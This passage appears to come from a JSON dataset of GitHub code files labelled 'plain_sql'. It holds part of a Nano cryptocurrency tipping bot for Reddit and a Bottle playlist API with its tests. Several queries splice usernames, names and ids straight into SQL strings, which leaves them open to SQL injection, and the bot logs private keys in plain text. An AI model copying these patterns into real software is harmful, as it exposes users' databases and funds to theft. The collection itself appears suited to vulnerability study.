response = \"At address %s, you currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new \" \\\r\n                   \"message containing the word 'receive'\\n\\nhttps://www.nanode.co/account/%s\" % (result[0][0], results[0]/10**30, results[1]/10**30,result[0][0])\r\n        reddit.redditor(username).message('Nano Tipper Z account balance', response)\r\n        return None\r\n\r\n    reddit.redditor(username).message('Nano Tipper Z: No account registered.', 'You do not have an open account yet')\r\n\r\n# currently deactivated\r\ndef handle_new_address(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        comment_or_message='message',\r\n        action='new_address',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        comment_text=str(message.body)[:255]\r\n    )\r\n    message.reply('not activated yet.')\r\n\r\n\r\n#updated\r\ndef handle_send(message):\r\n    parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    response = handle_send_nano(message, parsed_text, 'message')\r\n    message.reply(response + comment_footer)\r\n\r\n\r\n#updated\r\ndef handle_send_nano(message, parsed_text, comment_or_message):\r\n    user_or_address = '' # either 'user' or 'address', depending on how the recipient was specified\r\n    private_key = ''\r\n    adrress = ''\r\n    recipient = ''\r\n    recipient_username = ''\r\n    recipient_address = ''\r\n    message_time = datetime.utcfromtimestamp(message.created_utc) # time the reddit message was created\r\n    username = str(message.author) # the sender\r\n\r\n    entry_id = add_history_record(\r\n        username=username,\r\n        action='send',\r\n        comment_or_message=comment_or_message,\r\n        comment_id=message.id,\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n        comment_text=str(message.body)[:255]\r\n        )\r\n\r\n    # check if the message body was parsed into 2 or 3 words. If it wasn't, update the history db\r\n    # with a failure and return the message. If the length is 2 (meaning recipient is parent author) we will\r\n    # check that after tip amounts to limit API requests\r\n    if len(parsed_text) >= 3:\r\n        amount = parsed_text[1]\r\n        recipient = parsed_text[2]\r\n    elif len(parsed_text) == 2:\r\n        # parse the user info in a later block of code to minimize API requests\r\n        pass\r\n    else:\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('could not find tip amount', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return 'Could not read your tip or send command, or find an amount. Be sure the amount and recipient are separated by a space.'\r\n\r\n\r\n    # check that the tip amount is a number, and if it is high enough\r\n    # we will also check if the tip amount is above the user minimum after we get user information\r\n    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('could not parse amount', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return \"Could not read your tip or send amount. Is '%s' a number?\" % parsed_text[1]\r\n\r\n    try:\r\n        amount = float(parsed_text[1])\r\n    except:\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('could not parse amount', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return \"Could not read your tip or send amount. Is '%s' a number?\" % parsed_text[1]\r\n\r\n    if amount < program_minimum:\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('amount below program limit', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return 'You must send amounts of Nano above the program limit of %s.' % program_minimum\r\n\r\n    # check if author has an account, and if they have enough funds\r\n    mycursor.execute(\"SELECT address, private_key FROM accounts WHERE username='%s'\" % username)\r\n    result = mycursor.fetchall()\r\n    if len(result) < 1:\r\n        sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n        val = ('sender does not have an account', entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n\r\n        return 'You do not have a tip bot account yet. To create one, send me a PM containing the'\\\r\n               \" text 'create' in the message body, or get a tip from a fellow redditor!.\"\r\n    else:\r\n        address = result[0][0]\r\n        private_key = result[0][1]\r\n        results = check_balance(result[0][0])\r\n        if nano_to_raw(amount) > results[0]:\r\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n            val = ('insufficient funds', entry_id)\r\n            mycursor.execute(sql, val)\r\n            mydb.commit()\r\n            return 'You have insufficient funds. Your account has %s pocketed (+%s unpocketed) and you are '\\\r\n                          'trying to send %s. If you have unpocketed funds, create a new message containing the text'\\\r\n                          ' \"receive\" to pocket your incoming money.'%(results[0]/10**30, results[1]/10**30, amount)\r\n\r\n    # if there was only the command and the amount, we need to find the recipient.\r\n    # if it was a comment, the recipient is the parent author\r\n    # if it was a message, the program will respond with an error\r\n    if len(parsed_text) == 2:\r\n        if comment_or_message == 'comment':\r\n            recipient = str(message.parent().author)\r\n        else:\r\n            sql = \"UPDATE history SET notes = %s, WHERE id = %s\"\r\n            val = (\"no recipient specified\", entry_id)\r\n            mycursor.execute(sql, val)\r\n            mydb.commit()\r\n            return \"You must specify an amount and a user.\"\r\n\r\n    # remove the /u/ if a redditor was specified\r\n    if recipient[:3].lower() == '/u/':\r\n        recipient = recipient[3:]\r\n        print(recipient)\r\n\r\n    # recipient -- first check if it is a valid address. Otherwise, check if it's a redditor\r\n    if (recipient[:5].lower() == \"nano_\") or (recipient[:4].lower() == \"xrb_\"):\r\n        # check valid address\r\n        success = validate_address(recipient)\r\n        if success['valid'] == '1':\r\n            user_or_address = 'address'\r\n        # if not, check if it is a redditor disguised as an address (e.g. nano_is_awesome, xrb_for_life)\r\n        else:\r\n            try:\r\n                print(getattr(reddit.redditor(recipient), 'is_suspended', False))\r\n                user_or_address = 'user'\r\n            except:\r\n                # not a valid address or a redditor\r\n                sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n                val = ('invalid address or address-like redditor does not exist', entry_id)\r\n                mycursor.execute(sql, val)\r\n                mydb.commit()\r\n                return '%s is neither a valid address or redditor' % recipient\r\n    else:\r\n        try:\r\n            print(getattr(reddit.redditor(recipient), 'is_suspended', False))\r\n            user_or_address = 'user'\r\n        except:\r\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n            val = ('redditor does not exist', entry_id)\r\n            mycursor.execute(sql, val)\r\n            mydb.commit()\r\n            return \"Could not find redditor %s. Make sure you aren't writing or copy/pasting markdown.\" % recipient\r\n\r\n    # at this point:\r\n    # 'amount' is a valid positive number and above the program minimum\r\n    # 'username' has a valid account and enough Nano for the tip\r\n    # 'user_or_address' is either 'user' or 'address',\r\n    # 'recipient' is either a valid redditor or a valid Nano address\r\n\r\n    user_minimum = -1\r\n    # if a user is specified, reassign that as the username\r\n    if user_or_address == 'user':\r\n        #try to get the username information\r\n        recipient_username = recipient\r\n        sql = \"SELECT minimum, address FROM accounts WHERE username = %s\"\r\n        val = (recipient_username,)\r\n        mycursor.execute(sql, val)\r\n        myresult = mycursor.fetchall()\r\n        # if there is a result, pull out the minimum (in raw) and nano address for the recipient\r\n        if len(myresult) > 0:\r\n            print(myresult[0])\r\n            user_minimum = int(myresult[0][0])\r\n            recipient_address = myresult[0][1]\r\n    else:\r\n        # if the recipient is an address, check if they have an account\r\n        recipient_address = recipient\r\n        recipient_username = check_registered_by_address(recipient_address)\r\n        if recipient_username:\r\n            sql = \"SELECT minimum, address FROM accounts WHERE username = %s\"\r\n            val = (recipient_username,)\r\n            mycursor.execute(sql, val)\r\n            myresult = mycursor.fetchall()\r\n            print(myresult[0])\r\n            user_minimum = float(myresult[0][0])\r\n\r\n    # if either we had an account or address which has been registered, recipient_address and recipient_username will\r\n    # have values instead of being ''. We will check the minimum\r\n    if (user_minimum >= 0) and recipient_address and recipient_username:\r\n        if nano_to_raw(amount) < user_minimum:\r\n            sql = \"UPDATE history SET notes = %s WHERE id = %s\"\r\n            val = (\"below user minimum\", entry_id)\r\n            mycursor.execute(sql, val)\r\n            mydb.commit()\r\n\r\n            return \"Sorry, the user has set a tip minimum of %s. Your tip of %s is below this amount.\"%(user_minimum/10**30, amount)\r\n\r\n        if user_or_address == 'user':\r\n            notes = \"sent to registered redditor\"\r\n        else:\r\n            notes = \"sent to registered address\"\r\n\r\n        receiving_new_balance = check_balance(recipient_address)\r\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\r\n        val = (notes, address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        print(\"Sending Nano: \", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)\r\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\r\n        print(\"Hash: \", sent)\r\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\r\n        val = (sent['hash'], entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n\r\n        x = reddit.redditor(recipient_username).message('You just received a new Nano tip!',\r\n                                                    'You have been tipped %s Nano at your address of %s. Your new account balance will be '\r\n                                                    '%s received and %s unpocketed.' % (\r\n                                                    amount, recipient_address, receiving_new_balance[0] / 10 ** 30,\r\n                                                    (receiving_new_balance[1] / 10 ** 30 + amount)))\r\n\r\n        if user_or_address == 'user':\r\n            return \"Sent %s Nano to %s.\" % (amount, recipient_username)\r\n        else:\r\n            return \"Sent %s Nano to %s.\" % (amount, recipient_address)\r\n\r\n    elif recipient_address:\r\n        # or if we have an address but no account, just send\r\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\r\n        val = (\r\n            'sent to unregistered address', address, username, recipient_address, str(nano_to_raw(amount)), entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n\r\n        print(\"Sending Unregistered Address: \", address, private_key, nano_to_raw(amount), recipient_address)\r\n\r\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\r\n        print(\"Hash: \", sent)\r\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\r\n        val = (sent['hash'], entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        return \"Sent %s Nano to address %s.\" % (amount, recipient_address)\r\n\r\n    else:\r\n        # create a new account for redditor\r\n        recipient_address = add_new_account(recipient_username)\r\n\r\n\r\n        x = reddit. \\\r\n            redditor(recipient_username). \\\r\n            message('Congrats on receiving your first Nano Tip!',\r\n                    'Welcome to Nano Tip Bot! You have just received a Nano tip in the amount of %s at your address '\r\n                    'of %s. Here is some boilerplate.\\n\\n' % (\r\n                    amount, recipient_address) + help_text)\r\n\r\n        sql = \"UPDATE history SET notes = %s, address = %s, username = %s, recipient_username = %s, recipient_address = %s, amount = %s WHERE id = %s\"\r\n        val = (\r\n        \"new user created\", address, username, recipient_username, recipient_address, str(nano_to_raw(amount)), entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n\r\n        sent = send(address, private_key, nano_to_raw(amount), recipient_address)\r\n        print(\"Hash: \", sent)\r\n\r\n        sql = \"UPDATE history SET hash = %s WHERE id = %s\"\r\n        val = (sent['hash'], entry_id)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        print(\"Sending New Account Address: \", address, private_key, nano_to_raw(amount), recipient_address, recipient_username)\r\n        return \"Creating a new account for %s and \"\\\r\n                      \"sending %s Nano.\" % (recipient_username, amount)\r\n\r\n\r\ndef handle_receive(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)\r\n    username = str(message.author)\r\n    # find any accounts associated with the redditor\r\n    mycursor.execute(\"SELECT address, private_key FROM accounts WHERE username='%s'\" % username)\r\n    result = mycursor.fetchall()\r\n    if len(result) > 0:\r\n\r\n        open_or_receive(result[0][0], result[0][1])\r\n        balance = check_balance(result[0][0])\r\n        add_history_record(\r\n            username=username,\r\n            action='receive',\r\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n            address=result[0][0],\r\n            comment_or_message='message'\r\n        )\r\n        response = \"You currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new \" \\\r\n                   \"message containing the word 'receive' in the body\" % (balance[0] / 10 ** 30, balance[1] / 10 ** 30)\r\n        message.reply(response)\r\n    else:\r\n        add_history_record(\r\n            username=username,\r\n            action='receive',\r\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n            comment_or_message='message'\r\n        )\r\n        response = \"You do not currently have an account open. To create one, respond with the text 'create' in the message body.\"\r\n        message.reply(response)\r\n\r\n# updated\r\ndef handle_minimum(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    # user may select a minimum tip amount to avoid spamming. Tipbot minimum is 0.001\r\n    username = str(message.author)\r\n    # find any accounts associated with the redditor\r\n    parsed_text = message.body.replace('\\\\', '').split('\\n')[0].split(' ')\r\n\r\n    # there should be at least 2 words, a minimum and an amount.\r\n    if len(parsed_text) < 2:\r\n        response = \"I couldn't parse your command. I was expecting 'minimum <amount>'. Be sure to check your spacing.\"\r\n        message.reply(response)\r\n        return None\r\n    # check that the minimum is a number\r\n\r\n    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):\r\n        response = \"'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.\"\r\n        message.reply(response)\r\n    try:\r\n        amount = float(parsed_text[1])\r\n    except:\r\n        response = \"'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.\"\r\n        message.reply(response)\r\n\r\n    # check that it's greater than 0.01\r\n    if nano_to_raw(amount) < nano_to_raw(0.01):\r\n        response = \"The overall tip minimum is 0.01 Nano.\"\r\n        message.reply(response)\r\n\r\n    # check if the user is in the database\r\n    sql = \"SELECT address FROM accounts WHERE username=%s\"\r\n    val = (username, )\r\n    mycursor.execute(sql, val)\r\n    result = mycursor.fetchall()\r\n    print(result)\r\n    if len(result) > 0:\r\n        #open_or_receive(result[0][0], result[0][1])\r\n        #balance = check_balance(result[0][0])\r\n        add_history_record(\r\n            username=username,\r\n            action='minimum',\r\n            amount=nano_to_raw(amount),\r\n            address=result[0][0],\r\n            comment_or_message='message',\r\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n            comment_text=str(message.body)[:255]\r\n        )\r\n        sql = \"UPDATE accounts SET minimum = %s WHERE username = %s\"\r\n        print(amount)\r\n        print(nano_to_raw(amount))\r\n        val = (str(nano_to_raw(amount)), username)\r\n        print(val)\r\n        mycursor.execute(sql, val)\r\n        mydb.commit()\r\n        response = \"Updating tip minimum to %s\"%amount\r\n        message.reply(response)\r\n    else:\r\n        add_history_record(\r\n            username=username,\r\n            action='minimum',\r\n            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),\r\n            amount=nano_to_raw(amount),\r\n            comment_text=str(message.body)[:255]\r\n        )\r\n        response = \"You do not currently have an account open. To create one, respond with the text 'create' in the message body.\"\r\n        message.reply(response)\r\n\r\n\r\n# updated\r\ndef handle_help(message):\r\n    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created\r\n    add_history_record(\r\n        username=str(message.author),\r\n        action='help',\r\n        comment_or_message='message',\r\n        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S')\r\n        )\r\n    response = help_text\r\n    message.reply(response)\r\n\r\n\r\n# updated\r\ndef handle_comment(message):\r\n    # remove an annoying extra space that might be in the front\r\n    if message.body[0] == ' ':\r\n        parsed_text = str(message.body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    else:\r\n        parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    print(parsed_text)\r\n    print(len(parsed_text))\r\n    response = handle_send_nano(message, parsed_text, 'comment')\r\n    message.reply(response + comment_footer)\r\n\r\n\r\ndef handle_message(message):\r\n    message_body = str(message.body).lower()\r\n    print(\"Body: **\", message_body, \"**\")\r\n    if message.body[0] == ' ':\r\n        parsed_text = str(message.body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    else:\r\n        parsed_text = str(message.body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n    print(\"Parsed Text:\", parsed_text)\r\n\r\n    if parsed_text[0].lower() == 'help':\r\n        print(\"Helping\")\r\n        handle_help(message)\r\n\r\n    elif parsed_text[0].lower() == 'minimum':\r\n        print(\"Setting Minimum\")\r\n        handle_minimum(message)\r\n\r\n    elif parsed_text[0].lower() == 'create':\r\n        print(\"Creating\")\r\n        handle_create(message)\r\n\r\n    elif parsed_text[0].lower() == 'private_key':\r\n        print(\"private_keying\")\r\n        # handle_private_key(message)\r\n\r\n    elif parsed_text[0].lower() == 'new_address':\r\n        print(\"new address\")\r\n        # handle_new_address(message)\r\n\r\n    elif parsed_text[0].lower() == 'send':\r\n        print(\"send via PM\")\r\n        handle_send(message)\r\n\r\n    elif parsed_text[0].lower() == 'receive':\r\n        print(\"receive\")\r\n        handle_receive(message)\r\n\r\n    elif parsed_text[0].lower() == 'balance':\r\n        print(\"balance\")\r\n        handle_balance(message)\r\n    else:\r\n        add_history_record(\r\n            username=str(message.author),\r\n            comment_text=str(message.body)[:255],\r\n            comment_or_message='message',\r\n        )\r\n\r\n\r\n# main loop\r\nfor action_item in stream_comments_messages():\r\n    if action_item is None:\r\n        pass\r\n        #print('No news.')\r\n    elif action_item[0] == 'comment':\r\n        print(time.strftime('%Y-%m-%d %H:%M:%S'))\r\n        print('Comment: ', action_item[1].author, action_item[1].body[:20])\r\n        if action_item[1].body[0]==' ':\r\n            parsed_text = str(action_item[1].body[1:]).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n        else:\r\n            parsed_text = str(action_item[1].body).lower().replace('\\\\', '').split('\\n')[0].split(' ')\r\n        print('Parsed comment: ', parsed_text)\r\n        if parsed_text[0] == r'!nano_tip':\r\n            print('\\n')\r\n            print('*****************************************************')\r\n            print('found an item.')\r\n            handle_comment(action_item[1])\r\n\r\n    elif action_item[0] == 'message':\r\n        if action_item[1].author == 'nano_tipper_z':\r\n            pass\r\n        else:\r\n            print(time.strftime('%Y-%m-%d %H:%M:%S'))\r\n            print('A new message was found %s, sent by %s.'%(action_item[1], action_item[1].author ))\r\n            handle_message(action_item[1])\r\n\r\n\r\n\r\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Madmous/playlist/blob/d8e62b8455c0df9fdb85a5070b077961102b59f1",
        "file_path": "/main_test.py",
        "source": "import pytest\nimport bottle\nimport webtest\nimport MySQLdb\nimport os\n\nfrom logging import getLogger\nfrom bottle_mysql import Plugin\n\nfrom video import video_api\nfrom playlist import playlist_api\n\nfrom database import populate_test_database\n\nlogger = getLogger()\n\napp = bottle.default_app()\nplugin = Plugin(dbuser=os.environ[\"USER\"], dbpass=os.environ[\"PASSWORD\"], dbname='test')\napp.install(plugin)\ntest_app = webtest.TestApp(app)\n\n\ndef create_video(playlist_id, title, thumbnail, position):\n    db = connect_to_database()\n    cursor = db.cursor()\n    cursor.execute(\n        \"INSERT INTO video (playlist_id, title, thumbnail, position) VALUES('{playlist_id}', '{title}', '{thumbnail}', '{position}');\".format(\n            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))\n    db.commit()\n    db.close()\n\n\ndef create_playlist(name):\n    db = connect_to_database()\n    cursor = db.cursor()\n    cursor.execute(\n        \"INSERT INTO playlist (name, video_position) VALUES('{name}', 0);\".format(name=name))\n    db.commit()\n    db.close()\n\n\ndef connect_to_database():\n    db = MySQLdb.connect(\"localhost\", \"root\", os.environ[\"PASSWORD\"], 'test')\n    return db\n\n\ndef test_should_return_all_playlists():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_playlist('second playlist')\n\n    response = test_app.get('/playlists')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, name='first playlist'),\n                                     dict(id=2, name='second playlist')]\n\n\ndef test_should_return_a_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.get('/playlists/1')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == dict(\n        id=1, name='first playlist', video_position=0)\n\n\ndef test_should_create_a_playlist():\n    populate_test_database()\n\n    response = test_app.post('/playlists/nn')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/playlists')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == [dict(id=1, name='nn')]\n\n\ndef test_should_update_a_playlist_name():\n    populate_test_database()\n\n    response = test_app.post('/playlists/nn')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.put('/playlists/1/name')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/playlists')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == [dict(id=1, name='name')]\n\n\ndef test_should_delete_a_playlist_and_remove_all_its_videos():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_video(1, 'the title of the video',\n                 'the url of the video', 1)\n    create_video(1, 'the title of the video',\n                 'the url of the video', 2)\n\n    response = test_app.delete('/playlists/1')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/playlists/1')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == None\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == []\n\n\ndef test_should_return_all_the_videos_from_a_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_video(1, 'the title of the video',\n                 'the url of the video', 1)\n    create_video(1, 'the title of the video',\n                 'the url of the video', 2)\n\n    response = test_app.get('/videos/1')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, title='the title of the video',\n                                          thumbnail='the url of the video', position=1),\n                                     dict(id=2, title='the title of the video',\n                                          thumbnail='the url of the video', position=2)]\n\n\ndef test_should_return_all_the_videos():\n    populate_test_database()\n\n    create_playlist('first playlist')\n    create_playlist('second playlist')\n    create_video(1, 'f title',\n                 'f url', 1)\n    create_video(1, 's title',\n                 's url', 2)\n    create_video(1, 't title',\n                 't url', 3)\n    create_video(2, 'f title',\n                 'f url', 1)\n    create_video(2, 'fh title',\n                 'fh url', 2)\n\n    response = test_app.get('/videos')\n    assert response.json['status'] == 'OK'\n    assert response.json['data'] == [dict(id=1, playlist_id=1, title='f title',\n                                          thumbnail='f url', position=1),\n                                     dict(id=2, playlist_id=1, title='s title',\n                                          thumbnail='s url', position=2),\n                                     dict(id=3, playlist_id=1, title='t title',\n                                          thumbnail='t url', position=3),\n                                     dict(id=4, playlist_id=2, title='f title',\n                                          thumbnail='f url', position=1),\n                                     dict(id=5, playlist_id=2, title='fh title',\n                                          thumbnail='fh url', position=2)]\n\n\ndef test_should_create_a_video():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.post('/videos/1/title2/thumbnail2')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=2, title='title2', thumbnail='thumbnail2', position=2)]\n\n\ndef test_should_update_a_video_position():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    create_video(1, 'title', 'thumbnail', 1)\n    create_video(1, 'title2', 'thumbnail2', 2)\n    create_video(1, 'title3', 'thumbnail3', 3)\n    create_video(1, 'title4', 'thumbnail4', 4)\n\n    response = test_app.put('/videos/4/1/2')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.get('/videos/1')\n    assert response2.json['status'] == 'OK'\n    assert response2.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=4, title='title4',\n                                           thumbnail='thumbnail4', position=2),\n                                      dict(id=2, title='title2',\n                                           thumbnail='thumbnail2', position=3),\n                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=4)]\n\n\ndef test_should_delete_a_video_given_an_id_and_update_playlist_video_position():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.delete('/videos/1/1')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.get('/videos/1')\n    assert response3.json['status'] == 'OK'\n    assert response3.json['data'] == []\n\n    response4 = test_app.get('/playlists/1')\n\n    assert response4.json['status'] == 'OK'\n    assert response4.json['data'] == dict(\n        id=1, name='first playlist', video_position=0)\n\n\ndef test_should_reorder_video_position_given_a_deleted_video():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response2 = test_app.post('/videos/1/title2/thumbnail2')\n    assert response2.json['status'] == 'OK'\n\n    response3 = test_app.post('/videos/1/title3/thumbnail3')\n    assert response3.json['status'] == 'OK'\n\n    response4 = test_app.delete('/videos/2/1')\n    assert response4.json['status'] == 'OK'\n\n    response5 = test_app.get('/videos/1')\n    assert response.json['status'] == 'OK'\n    assert response5.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),\n                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=2)]\n\n    response6 = test_app.get('/playlists/1')\n    assert response6.json['status'] == 'OK'\n    assert response6.json['data'] == dict(\n        id=1, name='first playlist', video_position=2)\n\n\ndef test_should_return_a_not_ok_status_when_deleting_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.delete('/playlists/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_updating_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.put('/playlists/2/name')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_creating_a_video_from_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/2/title/thumbnail')\n\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_updating_a_video_from_an_unknown_id():\n    populate_test_database()\n\n    response = test_app.put('/videos/1/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_either_specifying_an_out_of_bounds_or_similar_position():\n    populate_test_database()\n\n    create_video(1, 'title', 'thumbnail', 1)\n    create_video(1, 'title2', 'thumbnail2', 2)\n\n    response = test_app.put('/videos/1/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n    response2 = test_app.put('/videos/1/1/5')\n    assert response2.json['status'] == 'NOK'\n    assert response2.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_deleting_a_video_from_an_unknown_playlist_id():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response = test_app.delete('/videos/1/2')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n\n\ndef test_should_return_a_not_ok_status_when_deleting_a_video_not_from_a_given_playlist():\n    populate_test_database()\n\n    create_playlist('first playlist')\n\n    response = test_app.post('/videos/1/title/thumbnail')\n    assert response.json['status'] == 'OK'\n\n    response = test_app.delete('/videos/2/1')\n    assert response.json['status'] == 'NOK'\n    assert response.json['message'] != None\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Madmous/playlist/blob/d8e62b8455c0df9fdb85a5070b077961102b59f1",
        "file_path": "/playlist/playlist_repository.py",
        "source": "\"\"\"This module is the playlist repository in charge of all database requests.\"\"\"\n\n\ndef retrieve_playlists(db):\n    db.execute('SELECT id, name from playlist;')\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_playlist_by_id(id, db):\n    db.execute(\n        \"SELECT id, name, video_position from playlist WHERE id={id};\".format(id=id))\n    row = db.fetchone()\n    return row\n\n\ndef delete_playlist(id, db):\n    db.execute(\"DELETE FROM playlist where id={id};\".format(id=id))\n\n\ndef update_playlist(id, name, db):\n    db.execute(\n        \"UPDATE playlist SET name='{name}' WHERE id={id};\".format(name=name, id=id))\n\n\ndef update_playlist_video_position(id, position, db):\n    db.execute(\n        \"UPDATE playlist SET video_position='{position}' WHERE id={id};\".format(position=position, id=id))\n\n\ndef create_playlist(name, db):\n    db.execute(\n        \"INSERT INTO playlist (name, video_position) VALUES('{name}', 0);\".format(name=name))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Madmous/playlist/blob/d8e62b8455c0df9fdb85a5070b077961102b59f1",
        "file_path": "/video/video_repository.py",
        "source": "\"\"\"This module is the video repository in charge of all database requests.\"\"\"\n\n\ndef retrieve_videos_from_playlist(playlist_id, db):\n    db.execute(\"SELECT id, title, thumbnail, position from video WHERE playlist_id={playlist_id} ORDER BY position ASC;\".format(\n        playlist_id=playlist_id))\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_videos(db):\n    db.execute(\n        \"SELECT id, playlist_id, title, thumbnail, position from video ORDER BY playlist_id ASC, position ASC;\")\n    rows = db.fetchall()\n    return rows\n\n\ndef retrieve_video(id, playlist_id, db):\n    db.execute(\"SELECT id, position from video WHERE id={id} and playlist_id={playlist_id};\".format(\n        id=id, playlist_id=playlist_id))\n    row = db.fetchone()\n    return row\n\n\ndef retrieve_last_video_position(playlist_id, db):\n    db.execute(\"SELECT max(position) as position from video WHERE playlist_id={playlist_id};\".format(\n        playlist_id=playlist_id))\n    row = db.fetchone()\n    return row['position']\n\n\ndef delete_video(id, db):\n    db.execute(\"DELETE FROM video where id={id};\".format(id=id))\n\n\ndef delete_playlists_videos(playlist_id, db):\n    db.execute(\"DELETE FROM video where playlist_id={playlist_id};\".format(\n        